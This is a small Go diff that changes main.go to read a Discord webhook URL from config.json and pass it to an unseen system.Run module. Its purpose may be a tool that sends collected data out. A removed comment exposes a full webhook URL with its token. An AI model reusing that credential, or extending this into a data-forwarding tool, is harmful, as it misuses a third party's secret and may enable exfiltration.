@@ -1,26 +1,38 @@
 package main
 
 import (
-	"fmt"
-	"os"
-    "C"
     "main.go/modules/system"
+	"encoding/json"
+	"fmt"
+	"io/ioutil"
+	"os"
 )
 
+// Define a struct to map the JSON
+type Config struct {
+	Webhook string `json:"webhook"`
+}
 
+func main() {
+	// Open the JSON file
+	file, err := os.Open("config.json")
+	if err != nil {
+		fmt.Println("Error opening file:", err)
+		return
+	}
+	defer file.Close()
 
-func PrintMessage(arg *C.char) {
+	// Read the file contents
+	bytes, err := ioutil.ReadAll(file)
 
-//	webhook := "https://discord.com/api/webhooks/1302674995280871545/fsmwXtFfChCn7ktcF3Gy8Pu0mv8YeOv9Izht3yC7Kstm5gHsa8ovmSvepksTpKXc7ICe"
+	var config Config
+	err = json.Unmarshal(bytes, &config)
 
-    webhook := C.GoString(arg)
 	defer func() {
 		if err := recover(); err != nil {
 			fmt.Fprintf(os.Stderr, "Error occurred: %v\n", err)
 		}
 	}()
 
-	system.Run(webhook)
+	system.Run(config.Webhook)
 }
-
-func main() {}
